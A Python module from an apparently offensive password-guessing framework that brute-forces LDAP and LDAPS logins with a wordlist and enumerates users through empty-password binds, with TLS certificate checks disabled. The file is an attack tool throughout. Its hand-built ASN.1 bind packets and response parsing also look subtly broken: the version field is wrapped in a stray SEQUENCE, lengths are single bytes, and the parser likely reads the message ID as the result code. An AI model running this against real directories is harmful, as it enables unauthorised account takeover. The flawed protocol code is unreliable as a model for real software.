"""LDAP brute-force module."""

import socket
import ssl
from core.bruteforce import BaseBrute


class LDAPBrute(BaseBrute):
    """LDAP brute-force implementation."""

    def __init__(self, target: str, port: int = 389, username: str = "admin",
                 wordlist: str = "wordlists/passwords.txt", threads: int = 5,
                 output_file: str = None, verbose: bool = False,
                 delay: float = 0.0, proxy: str = None,
                 base_dn: str = None, use_ssl: bool = False):
        super().__init__(target, port, username, wordlist, threads, output_file, verbose, delay, proxy)
        self.service = "LDAP"
        self.base_dn = base_dn
        self.use_ssl = use_ssl

    def try_login(self, username: str, password: str) -> bool:
        """Attempt LDAP bind authentication."""
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)

            # SSL wrapping if needed
            if self.use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=self.target)

            sock.connect((self.target, self.port))

            # Build LDAP Bind Request
            bind_request = self._build_bind_request(username, password)
            sock.send(bind_request)

            # Receive response
            response = sock.recv(4096)

            if not response:
                return False

            # Parse LDAP response
            # BindResponse = application 1
            # Result codes:
            #   0 = success
            #   49 = invalidCredentials
            #   32 = noSuchObject (base DN doesn't exist)
            result_code = self._parse_bind_response(response)

            if result_code == 0:
                return True
            elif result_code == 49:
                return False
            elif result_code == 32:
                # Base DN doesn't exist, but might still work
                return False
            else:
                return False

        except socket.timeout:
            if self.verbose:
                print(f"[!] LDAP timeout for {username}:{password}")
            return False
        except ConnectionRefusedError:
            if self.verbose:
                print(f"[!] LDAP connection refused")
            return False
        except Exception as e:
            if self.verbose:
                print(f"[!] LDAP error for {username}:{password}: {e}")
            return False
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass

    def _build_bind_request(self, username: str, password: str):
        """Build LDAP Bind Request packet."""
        # Build DN from username
        if self.base_dn:
            dn = f"cn={username},{self.base_dn}"
        else:
            dn = username

        # Encode DN and password
        dn_encoded = dn.encode('utf-8')
        password_encoded = password.encode('utf-8')

        # LDAP Bind Request structure
        # Application 0 = BindRequest
        # SEQUENCE {
        #   INTEGER messageID
        #   APPLICATION 0 {
        #     INTEGER version (3)
        #     OCTET STRING name (DN)
        #     [0] OCTET STRING simple (password)
        #   }
        # }

        # Simplified ASN.1 encoding
        # Message ID
        msg_id = b'\x02\x01\x01'  # INTEGER 1

        # Version
        version = b'\x30\x03\x02\x01\x03'  # INTEGER 3

        # DN
        dn_field = b'\x04' + bytes([len(dn_encoded)]) + dn_encoded

        # Password (context 0 = simple)
        pwd_field = b'\x80' + bytes([len(password_encoded)]) + password_encoded

        # Bind Request content
        bind_content = version + dn_field + pwd_field

        # Wrap in Application 0
        bind_request = b'\x60' + bytes([len(bind_content)]) + bind_content

        # Wrap in SEQUENCE with message ID
        content = msg_id + bind_request
        packet = b'\x30' + bytes([len(content)]) + content

        return packet

    def _parse_bind_response(self, response: bytes) -> int:
        """Parse LDAP Bind Response and return result code."""
        try:
            if len(response) < 10:
                return -1

            # Find result code in response
            # Result code is an INTEGER in the BindResponse
            for i in range(len(response) - 2):
                # Look for INTEGER tag (0x02)
                if response[i] == 0x02:
                    # Check if this is a short INTEGER
                    if response[i + 1] == 0x01:  # 1 byte length
                        return response[i + 2]
                    elif response[i + 1] == 0x02:  # 2 byte length
                        return (response[i + 2] << 8) | response[i + 3]

            return -1

        except Exception:
            return -1

    def enumerate_users(self, users: list) -> list:
        """
        Enumerate LDAP users.

        Args:
            users: List of usernames to check

        Returns:
            List of valid usernames
        """
        valid_users = []

        for username in users:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)

                if self.use_ssl:
                    import ssl
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=self.target)

                sock.connect((self.target, self.port))

                # Try bind with empty password
                bind_request = self._build_bind_request(username, "")
                sock.send(bind_request)

                response = sock.recv(4096)
                result_code = self._parse_bind_response(response)

                # result_code == 0 means valid user (empty password)
                # result_code == 49 means invalid credentials (user exists but wrong password)
                if result_code == 49:
                    valid_users.append(username)
                    if self.verbose:
                        print(f"[+] User found: {username}")

                sock.close()

            except Exception as e:
                if self.verbose:
                    print(f"[-] Error checking {username}: {e}")

        return valid_users


class LDAPSBrute(LDAPBrute):
    """LDAP over SSL brute-force."""

    def __init__(self, target: str, port: int = 636, **kwargs):
        super().__init__(target, port, use_ssl=True, **kwargs)
        self.service = "LDAPS"
